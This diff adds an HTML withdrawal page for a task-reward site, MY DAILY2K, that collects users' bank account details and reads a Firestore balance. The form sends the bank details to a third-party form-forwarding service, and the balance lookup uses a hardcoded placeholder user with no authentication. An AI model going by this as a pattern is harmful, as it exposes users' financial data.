@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MY DAILY2K Withdraw</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6f61, #dce35b);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            width: 100%;
+            padding: 20px;
+            background-color: #333;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .header h1 {
+            color: gold;
+            font-size: 24px;
+            margin: 0;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+        }
+
+        .top-right-buttons {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1;
+        }
+
+        .top-right-buttons .button {
+            background-color: gold;
+            color: #000;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            padding: 10px 20px;
+            font-size: 18px;
+            text-align: center;
+            transition: background-color 0.3s, transform 0.3s;
+            margin-left: 10px;
+        }
+
+        .top-right-buttons .button:hover {
+            background-color: #ffd700;
+            transform: scale(1.1);
+        }
+
+        .top-left-icon {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1;
+        }
+
+        .top-left-icon a {
+            color: gold;
+            font-size: 24px;
+            text-decoration: none;
+        }
+
+        .content {
+            margin-top: 80px; /* Adjust for fixed header */
+            padding: 20px;
+            text-align: center;
+        }
+
+        .balance-info {
+            background-color: #444;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .balance-info h2 {
+            margin: 0;
+            font-size: 20px;
+            color: gold;
+        }
+
+        .balance-info p {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        .withdraw-form {
+            background-color: #444;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: left;
+            margin: 0 auto;
+            max-width: 400px;
+        }
+
+        .withdraw-form label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+
+        .withdraw-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .withdraw-form button {
+            background-color: gold;
+            color: #000;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            padding: 10px 20px;
+            font-size: 18px;
+            text-align: center;
+            transition: background-color 0.3s, transform 0.3s;
+            width: 100%;
+        }
+
+        .withdraw-form button:hover {
+            background-color: #ffd700;
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>MY DAILY2K</h1>
+    </div>
+
+    <div class="top-left-icon">
+        <a href="dashboard.html"><i class="fas fa-home"></i></a>
+    </div>
+
+    <div class="top-right-buttons">
+        <button class="button" onclick="window.location.href='profile.html'">Profile</button>
+        <button class="button" onclick="window.location.href='task.html'">Task</button>
+    </div>
+
+    <div class="content">
+        <div class="balance-info">
+            <h2>Current Balance</h2>
+            <p><strong>Naira:</strong> <span id="nairaBalance">0</span></p>
+        </div>
+
+        <div class="withdraw-form">
+            <h2>Withdraw Funds</h2>
+            <form id="withdrawForm" action="https://formsubmit.co/1019461e1f3b953f7fb9a22047ae4ba4" method="POST">
+                <label for="accountName">Account Name:</label>
+                <input type="text" id="accountName" name="accountName" placeholder="Enter account name" required>
+
+                <label for="accountNumber">Account Number:</label>
+                <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter account number" required>
+
+                <label for="bankname">Account Number:</label>
+                <input type="text" id="bankname" name="bankname" placeholder="bankname" required>
+
+                <label for="nairaAmount">Amount (min 2000):</label>
+                <input type="number" id="nairaAmount" name="amount" placeholder="Enter amount" min="2000" required>
+
+                <button type="submit">Submit Withdrawal</button>
+            </form>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
+        import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCpH_yjFtiib-QuaCnHy2qeVyXhXikWTFg",
+            authDomain: "mydaily2kbot.firebaseapp.com",
+            projectId: "mydaily2kbot",
+            storageBucket: "mydaily2kbot.appspot.com",
+            messagingSenderId: "967002689133",
+            appId: "1:967002689133:web:e3a8d03eaf7cf2f1b7f964",
+            measurementId: "G-2VNDPK8V4J"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const telegramUsername = "sampleTelegramUser"; // Replace with actual Telegram username
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            await loadBalances(telegramUsername);
+        });
+
+        async function loadBalances(username) {
+            const userDocRef = doc(db, "users", username);
+            const docSnap = await getDoc(userDocRef);
+
+            if (docSnap.exists()) {
+                document.getElementById("nairaBalance").textContent = docSnap.data().nairaBalance || '0';
+            }
+        }
+    </script>
+</body>
+</html>
